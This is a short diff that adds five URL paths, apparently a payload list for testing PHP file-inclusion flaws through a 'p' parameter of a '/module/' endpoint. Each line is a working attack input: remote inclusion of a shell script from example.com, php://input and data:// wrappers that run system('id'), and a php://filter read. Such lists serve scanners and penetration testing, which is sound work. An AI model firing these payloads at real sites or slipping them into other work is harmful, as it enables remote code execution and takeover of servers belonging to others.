@@ -1,0 +1,5 @@
+/module/?p=http://example.com/shell.php
+/module/?p=php://input
+/module/?p=data://text/plain,<?php%20system('id');?>
+/module/?p=php://filter/read=convert.base64-encode/resource=php://input
+/module/?p=http://example.com/shell.php?<?php system('id');?>
